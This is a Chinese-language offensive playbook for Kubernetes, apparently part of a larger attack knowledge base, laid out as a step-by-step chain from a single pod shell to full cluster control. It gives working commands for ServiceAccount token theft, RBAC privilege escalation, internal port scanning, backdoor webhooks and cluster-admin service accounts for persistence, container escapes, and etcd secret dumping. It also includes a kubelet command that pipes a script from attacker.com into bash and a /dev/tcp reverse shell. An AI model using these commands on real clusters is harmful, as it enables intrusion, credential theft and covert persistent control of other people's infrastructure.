---
description: Kubernetes 集群攻击全链路。从单个 Pod Shell 到集群控制。覆盖 RBAC 滥用、etcd 攻击、Admission Controller 注入、ServiceAccount 利用、网络策略绕过、Service Mesh 绕过、容器逃逸。
---

# K8s 攻击全链路

## 核心原则

==K8s 攻击的目标是从一个 Pod/容器逐步提升到对整个集群的控制。核心思路：偷 Token → 调 API → 提权 → 控制集群。==

> 前置: Pod shell 通过 @web-exploit.md 漏洞利用或 @post-exploit.md 获取。容器网络受限时参考 @no-outbound.md。

## 攻击路径总览

```
单个 Pod Shell
  ├── 1. 信息收集（你是谁、在哪、能干嘛）
  ├── 2. ServiceAccount Token 利用（调 K8s API）
  ├── 3. RBAC 枚举与提权（你能做什么 → 怎么扩大权限）
  ├── 4. 横向到其他 Pod/Namespace
  ├── 5. 持久化（后门 Pod/Webhook/Shadow API）
  ├── 6. 逃逸到宿主机
  └── 7. 控制整个集群（etcd / kubelet / API Server）
```

---

## 步骤 1：信息收集

### 1a. 确认是否在 K8s Pod 中

```bash
# 方法1: cgroup 检查
cat /proc/1/cgroup | grep -iE "kubepods|kubelet|containerd|crio"

# 方法2: 环境变量
env | grep -iE "KUBERNETES|K8S"

# 方法3: ServiceAccount 挂载点
ls /var/run/secrets/kubernetes.io/serviceaccount/
# 存在说明在 K8s Pod 内

# 方法4: hostname（Pod 名通常是 deployment名-rsHash-podHash）
hostname
# 如: nginx-7b8f9c5d6-x7k2m → K8s Pod

# 方法5: /etc/resolv.conf（K8s DNS 后缀）
cat /etc/resolv.conf
# search <namespace>.svc.cluster.local svc.cluster.local cluster.local
```

### 1b. Pod 环境枚举

```bash
# ServiceAccount 信息
cat /var/run/secrets/kubernetes.io/serviceaccount/token       # JWT Token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace    # 当前 namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt       # API Server CA

# Pod 元数据（如果挂载了 downward API）
env | grep -iE "POD_|NAMESPACE|NODE_NAME|SERVICE_ACCOUNT|HOST_IP|POD_IP"

# 特权检测
cat /proc/1/status | grep -i "seccomp\|CapEff"
# CapEff: 0000003fffffffff → 普通容器
# CapEff: 000000ffffffffff → 较高权限
# CapEff: 000000ffffffffff + seccomp 0 → 可能是特权容器

# 挂载卷
mount | grep -vE "proc|sys|dev|tmpfs|cgroup|mqueue|shm|overlay"
# 关注: hostPath 挂载、PVC、ConfigMap/Secret 挂载

# 网络信息
ip addr; ip route
cat /etc/hosts
cat /etc/resolv.conf
# 注意 DNS 后缀: *.svc.cluster.local → 可以访问其他 K8s 服务
```

### 1c. API Server 定位

```bash
# 方法1: 环境变量（最常见）
env | grep KUBERNETES_SERVICE
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# 方法2: DNS 解析
nslookup kubernetes.default.svc.cluster.local

# 方法3: 
cat /etc/resolv.conf
# nameserver 10.96.0.10 → API Server 通常在 10.96.0.1

# API Server URL:
# https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/
```

---

## 步骤 2：利用 ServiceAccount Token

==Pod 内的 ServiceAccount Token 是 JWT，可以直接调 K8s API。权限取决于 ServiceAccount 绑定的 Role/ClusterRole。==

### 2a. 使用 Token 调用 API

```bash
# 方法1: curl + Token（如果有 curl）
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# 测试连通性
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces"

# 方法2: 安装了 kubectl
kubectl auth can-i --list

# 方法3: 用 kubectl 的 token 模式
kubectl --token="$TOKEN" --certificate-authority="$CACERT" --server="$APISERVER" get pods -A

# 方法4: 没有 curl（用 busybox wget 或其他语言）
# Python httplib / Ruby Net::HTTP / Node http / Perl LWP
```

### 2b. Token 权限枚举

```bash
# 1. 检查当前权限（SelfSubjectAccessReview）
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "namespace": "default",
        "verb": "list",
        "resource": "pods"
      }
    }
  }'

# 批量检查常见权限:
# pods: list/get/create/delete
# secrets: list/get
# deployments: list/get/create/patch
# services: list/get
# configmaps: list/get
# namespaces: list/get
# nodes: list/get
# serviceaccounts: list/get/create
# roles/rolebindings: list/get/create
# clusterroles/clusterrolebindings: list/get/create
# persistentvolumeclaims: list/get

# 2. 简化的权限检查（kubectl auth can-i）
kubectl --token="$TOKEN" --certificate-authority="$CACERT" --server="$APISERVER" \
  auth can-i --list -A 2>/dev/null

# 3. 如果没有 kubectl，写脚本批量测
for resource in pods secrets deployments services configmaps namespaces nodes; do
  for verb in list get create delete; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
      --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
      "$APISERVER/api/v1/$resource?limit=1" 2>/dev/null)
    [ "$code" = "200" ] && echo "[+] Can $verb $resource (ns: default)"
  done
done
```

---

## 步骤 3：RBAC 提权

==当前 SA 权限有限怎么办？找错误的 RBAC 配置来提权。==

### 3a. RBAC 常见提权路径

```
提权路径（按常见度排序）:

1. list secrets → 读其他 SA 的 token:
   kubectl get secrets -A
   kubectl get secret <high-privilege-sa-token> -o json | jq -r '.data.token' | base64 -d

2. create pods → 用高权限 SA 创建 Pod → 窃取其 token:
   YAML 中指定 serviceAccountName: cluster-admin-sa
   → Pod 创建后从内部读取 /var/run/secrets/.../token

3. update/patch deployments → 修改已有 deployment:
   kubectl patch deployment app-name -p '{"spec":{"template":{"spec":{"serviceAccountName":"cluster-admin-sa"}}}}'
   → 等待 Pod 重启 → 新 Pod 使用 cluster-admin 的 SA

4. create roles/rolebindings（在当前 namespace）→ 给自己加权限:
   kubectl create role privesc --verb='*' --resource='*' -n current-ns
   kubectl create rolebinding privesc --role=privesc --serviceaccount=current-ns:current-sa

5. create clusterroles/clusterrolebindings → 集群级提权（如果权限允许）

6. get nodes → 查看节点信息 → 配合 Pod 创建逃逸

7. create serviceaccounts → 创建新 SA + token → 绑定高权限

8. impersonate → 模拟其他用户/SA（如果 RBAC 允许）

9. exec into pods → 进入已有 Pod 窃取其 SA token

10. port-forward → 端口转发到内部服务 → 访问内部未授权服务

11. get configmaps → 读 ConfigMap 中的配置（可能含密钥/数据库密码）
```

### 3b. 自动化提权枚举

```bash
# 用 curl 批量检查是否有创建权限
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles" \
  -X POST -d '{"apiVersion":"rbac.authorization.k8s.io/v1","kind":"Role","metadata":{"name":"privesc-test"},"rules":[{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}]}'
# 201 Created → 可以创建角色 → 可以提权！

# 检查是否能创建 Pod
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" \
  -X POST -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test-pod"},"spec":{"containers":[{"name":"test","image":"busybox","command":["sleep","1"]}]}}'
# 201 Created → 可以创建 Pod → 可以偷 SA token
```

### 3c. ServiceAccount Token 窃取

```bash
# 列出所有 SA 的 secrets
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets"

# 读取特定 SA 的 token（secret type=kubernetes.io/service-account-token）
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/<sa-token-secret-name>"

# 解码 base64 token
echo "<base64_token>" | base64 -d
```

---

## 步骤 4：横向移动

### 4a. 发现集群内其他服务

```bash
# DNS 发现（K8s 内置 DNS）
# 服务格式: <service>.<namespace>.svc.cluster.local
nslookup kubernetes.default.svc.cluster.local
nslookup kube-dns.kube-system.svc.cluster.local

# 发现其他 namespace 的服务
for ns in default kube-system monitoring logging istio-system; do
  for svc in api db redis mongo mysql postgres elasticsearch kibana grafana prometheus; do
    nslookup "${svc}.${ns}.svc.cluster.local" 2>/dev/null | grep -v "can't resolve" && echo "[+] Found: ${svc}.${ns}"
  done
done

# 扫描 Service CIDR（通常 10.96.0.0/12）
for i in $(seq 0 255); do
  timeout 0.5 bash -c "echo >/dev/tcp/10.96.0.$i/443" 2>/dev/null && echo "10.96.0.$i:443 open"
done

# 扫描 Pod CIDR（通常 10.244.0.0/16 或 172.16.0.0/12）
for i in $(seq 0 255); do
  timeout 0.5 bash -c "echo >/dev/tcp/10.244.0.$i/80" 2>/dev/null && echo "10.244.0.$i:80 open"
done
```

### 4b. 用高权限 SA Token 访问其他 namespace

```bash
# 切换到偷到的高权限 token
HIGH_PRIV_TOKEN="<stolen-token>"

# 列所有 namespace 的 Pods
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $HIGH_PRIV_TOKEN" \
  "$APISERVER/api/v1/pods?limit=500"

# 列所有 namespace 的 Secrets
curl -sk --cacert "$CACERT" -H "Authorization: Bearer $HIGH_PRIV_TOKEN" \
  "$APISERVER/api/v1/secrets?limit=500"

# Exec 到其他 Pod（前提: SA 有 pods/exec 权限）
kubectl --token="$HIGH_PRIV_TOKEN" --certificate-authority="$CACERT" --server="$APISERVER" \
  exec -it <pod-name> -n <namespace> -- /bin/sh
```

### 4c. 访问内部未授权服务

```
常见内部未授权服务（K8s 集群内通常无认证）:
  - etcd: 2379（如果未启用 mTLS）
  - kubelet API: 10250（匿名访问常见）
  - Prometheus: 9090
  - Grafana: 3000
  - Elasticsearch: 9200
  - Kibana: 5601
  - Redis: 6379
  - MongoDB: 27017
  - MySQL: 3306
  - PostgreSQL: 5432
```

### 4d. Service Mesh 绕过（Istio/Linkerd）

==K8s + Service Mesh 环境中，微隔离在 Sidecar Proxy (Envoy) 层面实现。网络策略允许的通信可能在 mesh 层被额外阻断。==

**攻击 Sidecar 配置:**

```
1. 修改 EnvoyFilter → 放行自己的流量
2. 修改 DestinationRule → 改变流量路由
3. 如果 Pod 的 iptables 规则可写 → 直接绕过 Sidecar 拦截
4. 利用 Pod 内已存在的 iptables 规则中的例外（如健康检查端口/管理端口）
```

**攻击 mesh 控制面:**

```
Istio Control Plane (istiod):
  如果拿到 istiod 的 ServiceAccount → 直接修改 AuthorizationPolicy
  修改 PeerAuthentication → 降级 mTLS → 中间人攻击
  修改 Sidecar 资源 → 扩大 Pod 的出口范围
```

**检测 mesh 环境:**

```bash
# 检查 iptables 中是否有 Envoy 拦截规则
iptables -t nat -L -n | grep -iE "istio|envoy|15001|15006"

# 检查是否有 Envoy sidecar 进程
ps aux | grep -iE "envoy|pilot-agent"

# 检查 istio 相关的环境变量/挂载
env | grep -i istio
ls /etc/istio/ 2>/dev/null
```

---

## 步骤 5：持久化

### 5a. Shadow API Server

```
创建隐蔽的后门资源:
  1. 创建看似正常的 Deployment（名如 "monitoring-agent" "log-collector"）
  2. 挂载 high-privilege SA token
  3. 设置反向 shell 或定期 curl 回调
```

### 5b. Admission Controller 后门

```
MutatingWebhookConfiguration / ValidatingWebhookConfiguration:
  如果 SA 有创建 webhook 配置的权限:
    → 创建伪装成正常 webhook 的 MutatingWebhookConfiguration
    → 拦截所有 Pod 创建请求
    → 自动注入 sidecar 容器（反弹 shell）
    → 即使攻击者 Pod 被删，每次新建 Pod 都会重新植入

关键: Webhook 的 service 指向攻击者控制的内部服务
```

### 5c. 创建高权限 SA

```bash
# 创建 serviceaccount + clusterrolebinding
kubectl --token="$TOKEN" --certificate-authority="$CACERT" --server="$APISERVER" \
  create serviceaccount kube-admin -n kube-system

kubectl --token="$TOKEN" --certificate-authority="$CACERT" --server="$APISERVER" \
  create clusterrolebinding kube-admin-binding \
  --clusterrole=cluster-admin --serviceaccount=kube-system:kube-admin

# 获取 token（K8s 1.24+ 需要手动创建 token secret）
kubectl --token="$TOKEN" --certificate-authority="$CACERT" --server="$APISERVER" \
  create token kube-admin -n kube-system --duration=87600h
```

### 5d. kubelet API 后门

```
kubelet 端口 10250 常用于:
  - 执行命令: /run/<namespace>/<pod>/<container>
  - 获取 Pod 列表: /pods
  - 获取 Pod spec: /pods/<namespace>/<pod>

匿名访问 kubelet:
  curl -sk https://NODE_IP:10250/pods | jq '.'
  curl -sk https://NODE_IP:10250/run/<ns>/<pod>/<container> \
    -d 'cmd=id'
```

---

## 步骤 6：容器逃逸

详见 `post-exploit.md` 场景 I（容器逃逸），这里补充 K8s 特有的逃逸路径：

### K8s 特有逃逸

```
1. hostPath 挂载 → 写宿主机文件:
   mount 输出中有 /host 或 /rootfs
   → chroot /host → 宿主机 shell

2. privileged Pod → 直接 mount 宿主机磁盘:
   fdisk -l → mount /dev/sda1 /mnt → chroot /mnt

3. CAP_SYS_ADMIN → mount宿主机:
   mount /dev/sda1 /mnt → 写 crontab/SSH key

4. nsenter（需要特权 + 宿主机 PID namespace）:
   nsenter --target 1 --mount --uts --ipc --net --pid -- bash

5. /var/run/docker.sock 挂载:
   docker -H unix:///var/run/docker.sock run --privileged \
     -v /:/host -it alpine chroot /host

6. CRI socket (/var/run/containerd/containerd.sock):
   ctr --address /var/run/containerd/containerd.sock ... (类似 docker sock)

7. CVE-2022-0185 (内核 < 5.12): heap overflow 逃逸
8. CVE-2022-0847 (DirtyPipe, 内核 5.8-5.16): 写任意文件逃逸
```

---

## 步骤 7：控制整个集群

### 7a. etcd 攻击

```
etcd 是 K8s 的数据库，存储所有集群状态（包括 secrets）:

发现 etcd:
  - 默认端口 2379
  - 通常在 master 节点或 etcd 专用节点
  - 集群内 DNS: etcd-0.etcd.kube-system.svc.cluster.local

未授权访问:
  curl http://ETCD_IP:2379/v2/keys
  etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix

获取 secrets:
  etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix

如果 etcd 是 https（通常）:
  需要证书（如果 SA 有权限读 kube-system 下的 etcd 证书 secret）
  kubectl get secret etcd-certs -n kube-system -o yaml
```

### 7b. API Server 攻击

```
API Server 是 K8s 的大脑。控制 API Server = 控制集群。

1. 匿名访问检查:
   curl -sk https://APISERVER_IP:6443/api/v1/namespaces

2. Bootstrap token 爆破（如果存在）:
   /etc/kubernetes/bootstrap-kubelet.conf 中有 bootstrap token

3. ServiceAccount token 签发:
   如果有 create token 权限 → 给任意 SA 签发 token

4. PKI 证书窃取:
   master 节点 /etc/kubernetes/pki/ 目录有所有证书
   → kubelet 10250 /run → 或 Pod 挂载 hostPath → 读 pki 目录
```

### 7c. kubelet 全局控制

```
kubelet 管理每个节点上的所有 Pod。

1. 匿名 kubelet (10250):
   curl -sk https://NODE_IP:10250/pods

2. kubelet 执行命令（匿名或不验证证书）:
   curl -sk https://NODE_IP:10250/run/default/nginx-xxx/nginx \
     -d 'cmd=wget -O- http://attacker.com/shell.sh|bash'

3. 批量控制所有节点:
   从 API Server 获取所有 node IP:
   kubectl get nodes -o wide
   对每个 node 尝试 kubelet 10250 访问
```

---

## 攻击工具链

```
K8s 攻击常用工具（优先用已集成在镜像中的基础工具）:

侦查:
  - kubeletctl: kubelet 10250 交互工具
  - kube-hunter: K8s 渗透测试工具
  - kube-bench: 安全基线检查
  - kubeaudit: RBAC/配置审计

横向:
  - kubectl（如果有）: 官方 K8s CLI
  - curl/wget（通常有）: 直接调 API
  - kubesec: RBAC 风险分析

逃逸:
  - cdk: 容器渗透工具包（含逃逸检测/利用）
  - amicontained: 容器运行时检测（权限/能力/逃逸路径）
  - deepce: Docker 逃逸检测

后渗透:
  - Peirates: K8s 集群后渗透工具
  - botb: 容器环境侦察
```

---

## 走不通时

```
Pod 内什么都没有（distroless 镜像 / scratch 基础镜像 / 只读文件系统）？

├── 确认镜像类型 → 如果是 scratch，几乎不可能交互 → 只能靠漏洞链
├── 检查是否可写 /tmp → 很多只读镜像 /tmp 仍可写
├── 检查是否有 busybox 基础工具 → 很多轻量镜像用 busybox
├── 利用漏洞写入工具 → 反序列化漏洞写文件到 /tmp
├── 利用 /proc 文件系统 → /proc/1/root 可能是宿主机根目录
├── 利用 /dev/tcp 反弹 shell → bash -i >& /dev/tcp/IP/PORT 0>&1
├── 利用挂载卷中已有的工具 → mount 中有其他容器或宿主机的 bin
└── 死局 → 这 Pod 本身没什么利用价值，通过 API Server 创建新的可控 Pod
```

> 知识库路径见 @knowledge-base.md 或 @environment.md